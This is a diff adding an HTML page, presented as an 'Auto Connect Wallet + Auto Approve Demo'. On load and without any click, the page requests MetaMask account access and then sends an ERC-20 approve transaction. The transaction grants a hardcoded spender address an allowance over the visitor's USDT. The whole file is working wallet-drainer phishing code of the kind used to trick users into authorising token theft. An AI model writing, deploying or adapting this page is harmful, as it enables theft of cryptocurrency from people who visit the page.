@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Auto Connect & Approve</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+</head>
+<body>
+<h1>Auto Connect Wallet + Auto Approve Demo</h1>
+<div id="status">Connecting wallet and approving tokens...</div>
+
+<script>
+  // Replace these with your token and spender addresses
+  const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT example
+  const spenderAddress = "0xBd17d312C94A8e9F731F4A449cFD385E120AB10b"; // The contract or wallet allowed to spend tokens
+  const approveAmount = "100000000"; // 100 tokens in smallest unit (e.g., USDT = 6 decimals)
+
+  const tokenAbi = [
+    {
+      "constant": false,
+      "inputs": [
+        { "name": "_spender", "type": "address" },
+        { "name": "_value", "type": "uint256" }
+      ],
+      "name": "approve",
+      "outputs": [{ "name": "", "type": "bool" }],
+      "type": "function"
+    }
+  ];
+
+  async function connectWallet() {
+    if (window.ethereum) {
+      try {
+        // Request account access without any click
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        return accounts[0];
+      } catch (error) {
+        throw new Error("User rejected wallet connection");
+      }
+    } else {
+      throw new Error("MetaMask not detected");
+    }
+  }
+
+  async function approveTokens(web3, account) {
+    const tokenContract = new web3.eth.Contract(tokenAbi, tokenAddress);
+    const amount = web3.utils.toBN(approveAmount);
+
+    document.getElementById('status').innerText = "Sending approve transaction... Please confirm in MetaMask.";
+
+    try {
+      const tx = await tokenContract.methods.approve(spenderAddress, amount).send({ from: account });
+      document.getElementById('status').innerText = `Approval successful! TxHash: ${tx.transactionHash}`;
+    } catch (err) {
+      document.getElementById('status').innerText = `Approval failed: ${err.message}`;
+    }
+  }
+
+  window.addEventListener('load', async () => {
+    try {
+      const account = await connectWallet();
+      window.web3 = new Web3(window.ethereum);
+      await approveTokens(window.web3, account);
+    } catch (error) {
+      document.getElementById('status').innerText = error.message;
+    }
+  });
+</script>
+</body>
+</html>
